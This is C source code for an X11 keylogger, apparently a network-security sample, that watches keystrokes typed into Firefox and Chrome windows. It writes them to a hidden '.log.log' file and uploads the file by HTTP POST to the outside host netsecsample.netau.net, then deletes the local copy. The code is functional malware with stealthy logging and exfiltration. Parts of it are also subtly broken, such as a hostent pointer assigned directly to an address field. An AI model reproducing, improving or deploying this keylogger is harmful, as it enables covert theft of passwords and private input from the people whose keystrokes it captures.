#include <pthread.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <X11/Xutil.h>
#include <X11/Xlib.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <errno.h>
#include <arpa/inet.h>

//int lock = 0;
int wanted=0;
// update browser class list here
char *monitor_list[] = {"Firefox", "chrome", NULL};

int bit(unsigned char i) 
{
	switch (i)
	{
		case 1: return 0;
		case 2: return 1;
		case 4: return 2;
		case 8: return 3;
		case 16: return 4;
		case 32: return 5;
		case 64: return 6;
		case 128: return 7;
	}
}

struct conv {
    char from[20], to[5];
}

conv_table[] = {

    {"return","\n"},    {"escape","^["},    {"delete", "^H"},
    {"shift",""},       {"control",""},     {"tab","\t"},
    {"space", " "},     {"exclam", "!"},    {"quotedbl", "\""},
    {"numbersign", "#"},{"dollar", "$"},    {"percent", "%"},
    {"ampersand", "&"}, {"apostrophe", "'"},{"parenleft", "("},
    {"parenright", ")"},{"asterisk", "*"},  {"plus", "+"},
    {"comma", ","},     {"minus", "-"},     {"period", "."},
    {"slash", "/"},     {"colon", ":"},     {"semicolon", ";"},
    {"less", "<"},      {"equal", "="},     {"greater", ">"},
    {"questio", "?"},  {"at", "@"},        {"bracketleft", "["},
    {"backslash", "\\"},{"bracketright", "]"},{"asciicircum", "^"},
    {"underscore", "_"},{"grave", "`"},     {"braceleft", "{"},
    {"bar", "|"},       {"braceright", "}"},{"asciitilde", "~"},
    {"odiaeresis","ö"},{"udiaeresis","ü"},{"adiaeresis","ä"},{"",""}
};

struct conv_special {
    char from[20], to[5];
}

conv_tab_sp[] = {

    {"1","!"},    {"2","@"},    {"3", "#"},
    {"tab","\t"}, {"space", " "}, {"exclam", "!"},
    {"quotedbl", "\""}, {"4", "$"}, {"5", "%"},
    {"6", "^"}, {"7", "&"}, {"8", "*"},{"9", "("},
    {"0", ")"}, {"-", "_"},  {"=", "+"},
    {",", "<"},   {".", ">"},     {"/", "?"},
    {"'", "\""},  {"[", "{"},     {"]", "}"},
    {"\\", "|"},  {";", ":"}, {"`", "~"}, {"",""}
};

int convert(char *data, char *out) {
    int i=0;
    while (conv_table[i].from[0] != 0 || conv_table[i].to[0] != 0) {
        if (!strncasecmp(data, conv_table[i].from, strlen(conv_table[i].from)) ) {
            strcpy(out,  conv_table[i].to);
            return 1;
        }
        i++;
    }
    return 0;
}

int check_sp(char *data, char *out) {
    int i=0;
    while (conv_tab_sp[i].from[0] != 0 || conv_tab_sp[i].to[0] != 0) {
        if (!strncasecmp(data, conv_tab_sp[i].from, strlen(conv_tab_sp[i].from)) ) {
            strcpy(out,  conv_tab_sp[i].to);
            return 1;
        }
        i++;
    }
    return 0;
}

// thinking file operation (plus the encrytion stuff) might take some time,
// i handled this as a thread. and is stored in a hidden file ;)
void logfile (char ch)
{
	FILE 	*file;

	//while (lock) sleep(100);
	if (ch != '\0') {
		if((file = fopen(".log.log", "a+")) != NULL)
		{
		  	//lock = 1;
		  	fputc(ch, file);
		  	fclose(file);
		}
	}
	//lock = 0;
}


int submit()
{
    int sockfd = 0, n = 0;
    char recvBuff[1024];
    struct sockaddr_in serv_addr;

    memset(recvBuff, '0',sizeof(recvBuff));
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        //printf("\n Error : Could not create socket \n");
        return 0;
    }

    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(80);
    serv_addr.sin_addr.s_addr = gethostbyname("netsecsample.netau.net");

    if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
       //printf("\n Error : Connect Failed \n");
       return 0;

    return sockfd;
}

void upload()
{
    FILE*       file;
    char        buf[4096];
    int         size, n, i, socket, fsize;
    char        header[]  =  "Host: netsecsample.netau.net\r\n"
                             "Content-Type: multipart/form-data; boundary=1727381797619608628249622620\r\n"
                             "Connection: keep-alive\r\n"
                             "Content-Length: %d\r\n\r\n";

    char        startbuf[] = "--1727381797619608628249622620\r\n"
                             "Content-Disposition: form-data; name=\"file\"; filename=\"log.txt\"\r\n"
                             "Content-Type: text/plain\r\n\r\n";

    char 		endbuf[]   = "\r\n--1727381797619608628249622620--";

    if((file = fopen(".log.log", "r")) != NULL) {
    	//lock = 1;
        fseek(file, 0L, SEEK_END);
        fsize = ftell(file);

        if (fsize < 512) {
        	fclose(file);
        	return;
        }
        socket = submit();

        memset(buf, '\0', sizeof(buf));
        sprintf(buf, header, sizeof(startbuf) + sizeof(endbuf) + fsize);

        send(socket, buf, strlen(buf), 0);
        send(socket, startbuf, sizeof(startbuf), 0);

        rewind(file);
        while (!feof(file)) {
            memset(buf, '\0', sizeof(buf));
            fread(buf, sizeof(buf), 1, file);
            size = strlen(buf);
            for (i=0;;) {
                n = send(socket, buf+i, size-i, 0);
                if (n == 0) break;
                i += n;
            }

        }
        send(socket, endbuf, sizeof(endbuf), 0);
        fclose(file);
        remove(".log.log");
        //lock = 0;
        read(socket, buf, sizeof(buf)-1);
    }
}

void log1(char *buf, int masked,  char *c, int caps)
{
	char in[128];
	int err;
	pthread_t tid=0;

	if (strlen(buf) > 1) {// or ignore
		if (convert(buf, in))
			if (masked == 1) 
				if (check_sp(in, in))
					*c=*in;
				else
					*c=*in;
			else 
				*c=*in;
		else
			*c=*buf;
	}
	else {
		if (caps == 1 || (caps == 0 && masked == 1))
			if (check_sp(buf, in))
				*c=*in;
			else
				*c=toupper(*buf);
		else
			*c=*buf;
	}

	err = pthread_create(&tid, NULL, &logfile, *c);
	if (err !=0 ) // did not create the thread? try direcly
		logfile(*c);

	upload();
	printf("%c", *c);
}

int ourInterest(Display* d, Window w)
{
    Status status;
    XClassHint *class;
    char *window_name;
    int i;

    class = XAllocClassHint();
    status = XGetClassHint(d, w, class);
    if (XFetchName(d, w, &window_name)) {
    //if (status != 0) {
    //printf("%s\n", class->res_class);
       for (i=0; monitor_list[i] != NULL; i++) {
          if (strstr(window_name, monitor_list[i]) != NULL) {
            XFree(class);
            wanted = 1;
            return 1;
          }
    	}
  	}
  	XFree(class);
  	//if (monitor_list[i] == NULL)
  		wanted = 0;

  	return 1;
}

int main() 
{
	unsigned char szKey[32];
	unsigned char szKeyOld[32];	
	unsigned int keycode;
	int masked=0, caps=0;
	char kname[64], *keyname, keysym;
	Display *display;	
	char *window_name;
	Window window, prev_w;
	int i;
	char current=0;
	char loop;
	int count=0;
    int revert;

	display = XOpenDisplay(NULL);
	if(display == NULL) {
		return -1;
	}

	XQueryKeymap(display, szKeyOld);
	while (1) {
		usleep(5000);
		fflush(stdout);


		XGetInputFocus(display, &window, &revert);
		//if (XFetchName(display, window, &window_name)) {
			//printf("monitor: %s\n", window_name);
		//	ourInterest(display, window);

			//prev_w = window;
		//}
		//else {
		//if (window != prev_w) wanted = 0;
		//}
		XQueryKeymap(display, szKey);

		loop = 0;
		for (i=0; i<32; i++) {
			if(szKeyOld[i] != szKey[i]) {
				loop = 1;
				count = 0;
				keycode = i*8 + bit(szKey[i] ^ szKeyOld[i]);

				if((szKey[i] & (szKey[i] ^ szKeyOld[i])) != 0) {

					keysym = XKeycodeToKeysym(display, keycode, 0);
					keyname = XKeysymToString(keysym);

					if (!keyname) {
						keyname = "";

						if (keycode == 50 || keycode == 62) {
							// shift is down
							masked = 1;
						} else if (keycode == 22) {
							keyname = "backspace";
						} else if (keycode == 66) {
							// caps lock
							caps = !caps;
						} else if (keycode == 23) {
							keyname = "tab";
						} else if (keycode == 36 || keycode == 104) {
							keyname = "return";
						}

						//if (wanted)
						XGetInputFocus(display, &window, &revert);
						if (ourInterest(display, window))
							log1(keyname, masked, &current, caps);
					}
					else {
						if (strcmp(keyname, "Q") == 0) {
							keyname = "";
						} else if (strcmp(keyname, "S") == 0) {
							keyname = "";
						} else if (strcmp(keyname, "R") == 0) {
							keyname = "";
						} else if (strcmp(keyname, "T") == 0) {
							keyname = "";
						}

						//if (wanted)
						XGetInputFocus(display, &window, &revert);
						if (ourInterest(display, window))
							log1(keyname, masked, &current, caps);

					} 
				}
				else {
					if(keycode == 50 || keycode == 62) {
						// shift is up
						masked = 0;
					} else
						current=0;
				}
				szKeyOld[i] = szKey[i];				
			}
		}
		if (!loop) {
			count++;
			if (count == 50) {
				if (current != 0) {
					logfile(current);
					printf("%c", caps == 1 || (caps == 0 && masked == 1) ? toupper(current) : tolower(current));
					count = 0;
				}
			}
		}
		//wanted = 0;
	}
	XCloseDisplay(display);
	return 0;
}
